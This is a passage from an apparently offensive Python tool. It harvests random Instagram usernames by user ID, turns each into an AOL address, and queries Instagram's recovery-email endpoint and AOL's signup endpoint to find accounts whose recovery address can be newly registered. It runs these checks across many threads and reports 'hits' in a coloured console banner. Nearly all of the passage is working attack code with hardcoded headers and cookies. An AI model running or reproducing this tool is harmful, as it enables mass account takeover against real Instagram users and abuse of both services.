Languages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=&lastName=&userid-domain=yahoo&userId={gg}&password=&mm=&dd=&yyyy=&signup='
    response = requests.post('https://login.aol.com/account/module/create', params=params,  headers=headers, data=data,cookies=cookies).text
    if '{"errors":[{"name":"firstName","error":"FIELD_EMPTY"},{"name":"lastName","error":"FIELD_EMPTY"},{"name":"birthDate","error":"INVALID_BIRTHDATE"},{"name":"password","error":"FIELD_EMPTY"}]}' in response:
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:ethan(email)
  
def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'

    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
  

        
        
        
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }



        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
   
         
        if '"status":"ok"' in respon:ethan(email)
        else:bads_instgram+=1
        
    
  except:''
  os.system('clear' if os.name ==
	 		'posix' else 'cls')
  bi = random.randint(5,208)
  bos = f'\x1b[38;5;{bi}m'
  tt=(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
\x1b[1;32m ༄𝙃𝙄𝙏𝙎 : {hits}\n\x1b[1;33m ༄𝘽𝘼𝘿 𝙄𝙂 : {bads_instgram} \n\x1b[1;36m ༄𝗕𝗔𝗗 𝗠𝗔𝗜𝗟 : {bads_email}  \n༄\x1b[1;36m 𝗠𝗔𝗜𝗟𝗦 : {email}\n\x1b[1;32m  ༄𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑 : @MYEHRA
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙       
    ''')
  print(tt)

executor = ThreadPoolExecutor(max_workers=30)
def qcq():
  global bv
  while True:
    try:
      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(randrange(10000,uid))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': 'ehra'+lsd,
  }
      data = {
      'lsd': 'ehra'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']#['@ehra'
      email=username+'@aol.com'
      check(email)
    except:''
def qqq():

    while True:
        try:
            pp=''.join(choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(18))
            cookies = {
    
    'ds_user_id': '62725715526',
    
    
}

            headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/direct/inbox/',
    'user-agent': generate_user_agent(),
}
            data = {
    'variables': '{"id":"'+str(randrange(10000,uid))+'","render_surface":"PROFILE"}',
    'doc_id': '7663723823674585',
}
            response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data).json()
            
            username=response['data']['user']['username']
            email=username+'@aol.com'
            check(email)
        except:''
print('')	
os.system('clear')
print(f'''◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙{WDEH}◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙''')
pass
print (f'''\033[1;37m
{S}2 - Random [ Session 1]

◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{ksmk}3 - Random [ Session 2]

◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
''')
   
jhh=int(input(f'{S}choice :  '))
if jhh ==0:
	for username in list99:
		email = username + '@aol.com'
		executor.submit(check, email)
	os.system ('clear')       	     
	           		
elif jhh==1:

    print(f'''\033[1;30m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙

1[] 2013
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
2[] 2012 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
3[] 2011 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
4[] 2014
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
5[] 2015
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙''')
    print(f'Select the year')
    num=input(f'Select Option :- ')
    if num=='1':
    	uid=361365132
    elif num=='2':
    	uid=257924624
    elif num=='3':
    	uid=18957417
    elif num=='4':
    	uid=1682665388
    elif num=='5':
    	uid=2682665388
    else:
    	idd()
    for _ in range(100):
    	executor.submit(qqq)
    
elif jhh==2:
	  
    print(f'''
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{Z}  1→2013
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{Y}  2→2012 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{C}  3→2011 
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{P}  4→2014
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
{S}5→ 2015
◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
''')
    print(f'{ED}Select the Year')
    num=input(f'{F}⛧Choose   → ')
    if num=='1':
    	uid=361365132
    elif num=='2':
    	uid=257924624
    elif num=='3':
    	uid=18957417
    elif num=='4':
    	uid=1682665388
    elif num=='5':
    	uid=2682665388
    else:
    	idd()
    for _ in range(100):
    	executor.submit(qcq)
